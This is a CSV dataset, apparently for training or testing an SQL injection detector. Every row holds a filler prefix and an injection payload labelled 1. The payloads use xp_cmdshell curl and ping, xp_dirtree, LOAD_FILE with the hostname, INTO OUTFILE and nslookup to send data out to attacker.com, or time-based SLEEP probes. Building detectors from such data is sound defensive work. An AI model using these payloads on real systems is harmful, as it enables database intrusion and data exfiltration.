content,label
i6l6pi@'; EXEC xp_fileexist '\\attacker.com\check'--,1
wkjvo97@'; EXEC xp_fileexist '\\attacker.com\check'--,1
美过并行除间界反下往族件料'; EXEC xp_fileexist '\\attacker.com\check'--,1
"47nl87xr5nf@' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"jb6kwh8iatbr@' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"教程 error 37 ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"功能 ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
过教大何器'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
server 评测 '; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
ghi0pe50@'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
"评测 user 82 ' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"对比 ' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"crebqp71d@' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"query 753 ' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
2md3l7o@'; exec master..xp_dirtree '\\attacker.com\data'--,1
优势 '; exec master..xp_dirtree '\\attacker.com\data'--,1
cbjnf@'; exec master..xp_dirtree '\\attacker.com\data'--,1
计率选今两己'; exec master..xp_dirtree '\\attacker.com\data'--,1
教程 '; exec master..xp_fileexist '\\attacker.com\info'--,1
革效每用海值般拉每认候社较七系'; exec master..xp_fileexist '\\attacker.com\info'--,1
i3d8t@'; exec master..xp_fileexist '\\attacker.com\info'--,1
权基队王现和场一列近表商习公'; exec master..xp_fileexist '\\attacker.com\info'--,1
query 价格 '; exec master..xp_fileexist '\\attacker.com\info'--,1
什么是 '; exec master..xp_cmdshell 'ping attacker.com'--,1
下载 '; exec master..xp_cmdshell 'ping attacker.com'--,1
3hbebj1g5@'; exec master..xp_cmdshell 'ping attacker.com'--,1
"g5apyx2cjs@' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"search 685 ' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"dg1p4y@' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"各持两特她近影几越' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"cp461u70ah65@' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"如何 user ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"优势 account ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"v15cy05e4@' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
使用方法 '; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
评测 '; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
ukvzqrmm74a@'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
error 760 '; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
"排名 ' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"最新 ' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"wo3nfi9b@' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"再提行' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"价格 page 35 ' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"6o760tk@' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"处海劳期后克候场么步' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"百因定发起形院' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"immb76yyfp@' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"图制给义' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"server 860 ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"推荐 login 40 ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"vsq3f0x4b6@' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"47y183wbl@' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"多少钱 view ' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
怎么样 '; EXEC xp_dirtree '\\attacker.com\data'--,1
什么是 admin '; EXEC xp_dirtree '\\attacker.com\data'--,1
c3fjb@'; EXEC xp_dirtree '\\attacker.com\data'--,1
hk77d0i08kje@'; EXEC xp_dirtree '\\attacker.com\data'--,1
dwbhe59mvemw@'; EXEC xp_dirtree '\\attacker.com\data'--,1
议提主数据到两平'; EXEC xp_fileexist '\\attacker.com\check'--,1
account 教程 '; EXEC xp_fileexist '\\attacker.com\check'--,1
warning 903 '; EXEC xp_fileexist '\\attacker.com\check'--,1
别没名观花事节究'; EXEC xp_fileexist '\\attacker.com\check'--,1
什么是 info 50 '; EXEC xp_fileexist '\\attacker.com\check'--,1
"下载 info ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"多少钱 ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"system 843 ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"哪里买 ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
子进气铁们至点划区度流住快'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
f86hvg6i645e@'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
ljjsob6y@'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
"product 评测 ' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"z1h03fu@' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"vkk6u6jp@' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"最新 ' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
account 182 '; exec master..xp_dirtree '\\attacker.com\data'--,1
对比 '; exec master..xp_dirtree '\\attacker.com\data'--,1
最新 setting 61 '; exec master..xp_dirtree '\\attacker.com\data'--,1
fa0fq3w@'; exec master..xp_dirtree '\\attacker.com\data'--,1
n94en@'; exec master..xp_fileexist '\\attacker.com\info'--,1
product 620 '; exec master..xp_fileexist '\\attacker.com\info'--,1
6mqnd8qolhm@'; exec master..xp_fileexist '\\attacker.com\info'--,1
system 下载 '; exec master..xp_fileexist '\\attacker.com\info'--,1
l9q3g35qb@'; exec master..xp_cmdshell 'ping attacker.com'--,1
fg4t2sfk@'; exec master..xp_cmdshell 'ping attacker.com'--,1
三大国能成地度开风己近关标义'; exec master..xp_cmdshell 'ping attacker.com'--,1
9ufwaxv@'; exec master..xp_cmdshell 'ping attacker.com'--,1
6rhwswc@'; exec master..xp_cmdshell 'ping attacker.com'--,1
"16n1m9o0@' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"li5sbt3zugt@' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"派万权' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"次克单不月适取动商机' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"怎么样 ' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"那如采好由格争属等上' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"度理斗问已程产车' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"7pvc8ganeck@' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
cpm9ro399d@'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
干图话支已'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
bmh8w4qno3q8@'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
"2024 ' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"password 946 ' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"哪里买 ' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"最新 product 24 ' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"ro0l2j1bmymq@' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"warning 210 ' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"改前太你可林强西状性水平个了' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"什么是 ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"怎么样 ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"info 特点 ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"qz9314sl9b@' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"文做声地位都一却从住查知叫从节' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"对比 ' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"教程 ' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
哪里买 '; EXEC xp_dirtree '\\attacker.com\data'--,1
warning 119 '; EXEC xp_dirtree '\\attacker.com\data'--,1
error 最新 '; EXEC xp_dirtree '\\attacker.com\data'--,1
server 价格 '; EXEC xp_dirtree '\\attacker.com\data'--,1
对比 '; EXEC xp_fileexist '\\attacker.com\check'--,1
jy4wgrfcp@'; EXEC xp_fileexist '\\attacker.com\check'--,1
w2ax2b47h3@'; EXEC xp_fileexist '\\attacker.com\check'--,1
"test 164 ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"a3h7t9oo@' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"database 教程 ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
推荐 '; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
ca3wh@'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
8nmjhg565i5@'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
评测 '; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
"价格 ' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"验建式研布家在上六争过直现' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"使用方法 error ' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
exspt4i@'; exec master..xp_dirtree '\\attacker.com\data'--,1
功能 account '; exec master..xp_dirtree '\\attacker.com\data'--,1
kzioufy@'; exec master..xp_fileexist '\\attacker.com\info'--,1
error 如何 '; exec master..xp_fileexist '\\attacker.com\info'--,1
zxe6v@'; exec master..xp_fileexist '\\attacker.com\info'--,1
排名 '; exec master..xp_fileexist '\\attacker.com\info'--,1
server 283 '; exec master..xp_cmdshell 'ping attacker.com'--,1
h4k7tms146s@'; exec master..xp_cmdshell 'ping attacker.com'--,1
我维半据半细复越则三些还治查'; exec master..xp_cmdshell 'ping attacker.com'--,1
po7tn74@'; exec master..xp_cmdshell 'ping attacker.com'--,1
"教程 ' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"区指称解进定' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"议带铁型族些此识在政价' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"warning 功能 ' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"影育书题太' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"server 最新 ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
最新 '; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
uoeaptroyb@'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
叫比带在住十线风热好京新备日'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
"克时织没做制业强数位极口风' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"s8oyp@' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"什么是 ' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"转转除使斯' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"都族来' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"专正系力经全两广' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"百局华候委影状目八斗' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"z3pm8g4z@' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"多少钱 ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"40j00a@' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"42l0u@' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"世因具快东空她我第行千正速' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"排名 ' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
7gcl7@'; EXEC xp_dirtree '\\attacker.com\data'--,1
38zpyux5z2t@'; EXEC xp_dirtree '\\attacker.com\data'--,1
多少钱 account '; EXEC xp_dirtree '\\attacker.com\data'--,1
评测 '; EXEC xp_fileexist '\\attacker.com\check'--,1
xbkanm1gzi11@'; EXEC xp_fileexist '\\attacker.com\check'--,1
被程些实'; EXEC xp_fileexist '\\attacker.com\check'--,1
立状场她圆住每效起织持民派北'; EXEC xp_fileexist '\\attacker.com\check'--,1
"下载 password ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"压收子状' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"排名 ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"严确却设种数还千' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
如何 '; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
排名 query '; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
要说志感儿正素民保消认再以速形'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
fail 333 '; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
好不好 '; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
"教程 server 48 ' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"思眼法第世' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
r1ftz@'; exec master..xp_dirtree '\\attacker.com\data'--,1
律话其容政调'; exec master..xp_dirtree '\\attacker.com\data'--,1
价格 item '; exec master..xp_dirtree '\\attacker.com\data'--,1
success 推荐 '; exec master..xp_dirtree '\\attacker.com\data'--,1
vbp85i4a0s3@'; exec master..xp_fileexist '\\attacker.com\info'--,1
果加何质'; exec master..xp_fileexist '\\attacker.com\info'--,1
什么是 order '; exec master..xp_fileexist '\\attacker.com\info'--,1
级往权经'; exec master..xp_cmdshell 'ping attacker.com'--,1
"fail 101 ' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"好不好 system 16 ' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"小但先际' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"xoy6h8xxej@' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"推荐 data 26 ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"接价带道族社' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"zimz0b1j6oy@' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
hj3sg@'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
好不好 test 42 '; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
"功能 ' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"setting 教程 ' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"klwhx@' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"profile 657 ' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"得应他且每' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"fail 怎么样 ' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"间参基史划国' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"最新 success ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"3mywzt@' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"哪里买 data ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"什么是 error ' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"yzb0jl2bx@' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"下载 server ' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
头立价战你动全二史比'; EXEC xp_dirtree '\\attacker.com\data'--,1
好不好 '; EXEC xp_dirtree '\\attacker.com\data'--,1
order 280 '; EXEC xp_dirtree '\\attacker.com\data'--,1
aj4l08eevb@'; EXEC xp_fileexist '\\attacker.com\check'--,1
排名 setting '; EXEC xp_fileexist '\\attacker.com\check'--,1
最新 page 63 '; EXEC xp_fileexist '\\attacker.com\check'--,1
代立装'; EXEC xp_fileexist '\\attacker.com\check'--,1
xd6a7@'; EXEC xp_fileexist '\\attacker.com\check'--,1
"x9ggv7atd@' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"布事物包最知' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"search 204 ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"info 下载 ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
test 2024 '; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
"hkgobff9kplw@' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"3v7otu95d@' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"product 700 ' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
推荐 setting '; exec master..xp_dirtree '\\attacker.com\data'--,1
wlzf9@'; exec master..xp_dirtree '\\attacker.com\data'--,1
gzohm3@'; exec master..xp_dirtree '\\attacker.com\data'--,1
account 744 '; exec master..xp_dirtree '\\attacker.com\data'--,1
哪里买 '; exec master..xp_fileexist '\\attacker.com\info'--,1
第理周术价此红接火率研建能只'; exec master..xp_fileexist '\\attacker.com\info'--,1
优势 '; exec master..xp_fileexist '\\attacker.com\info'--,1
info 307 '; exec master..xp_cmdshell 'ping attacker.com'--,1
10kvmz7nn@'; exec master..xp_cmdshell 'ping attacker.com'--,1
2024 test 20 '; exec master..xp_cmdshell 'ping attacker.com'--,1
"一特也较酸始路家来省' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"qe6dwvuk@' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"质委林照存求好场新变设满' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"li52n0f4@' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"图件真布满' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"反支片也提制资除身则无采' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
统系值圆示'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
k9l9h34@'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
都长此已众名族起行处持清广使收'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
"支备外后长人利道达么说科越' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"物共务道离验满' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"u3xmr5sy@' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"view 387 ' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"内是确得中路好流' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"料主接周且速感四图' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"速图方步记保况' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"王理风原接' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"suuwd9v9q@' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"识名联把极省图至写无装' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"eqt9vq@' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"团识受须思际' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"2024 fail ' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"教程 server ' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"qlhp9h@' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
0mpzptp0flo@'; EXEC xp_dirtree '\\attacker.com\data'--,1
对比 error '; EXEC xp_dirtree '\\attacker.com\data'--,1
ksj7v@'; EXEC xp_dirtree '\\attacker.com\data'--,1
success 推荐 '; EXEC xp_fileexist '\\attacker.com\check'--,1
特点 '; EXEC xp_fileexist '\\attacker.com\check'--,1
6hbkw1rjsa@'; EXEC xp_fileexist '\\attacker.com\check'--,1
推荐 page '; EXEC xp_fileexist '\\attacker.com\check'--,1
"什么是 ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"如何 database 75 ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"立京反往什包处九' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"题市每快十维京连东况车真' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
府家关百土所亲完单千'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
与许响号新制式'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
2024 '; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
profile 591 '; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
0f67yz@'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
"0ljco4nicvey@' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"cx0lg2k2y9w@' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"说存术文段此不通何还响' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"家再向断那五史非低任义' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"信中工识即组' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
教程 '; exec master..xp_dirtree '\\attacker.com\data'--,1
nsu794aj7x@'; exec master..xp_dirtree '\\attacker.com\data'--,1
uh4eb4x@'; exec master..xp_dirtree '\\attacker.com\data'--,1
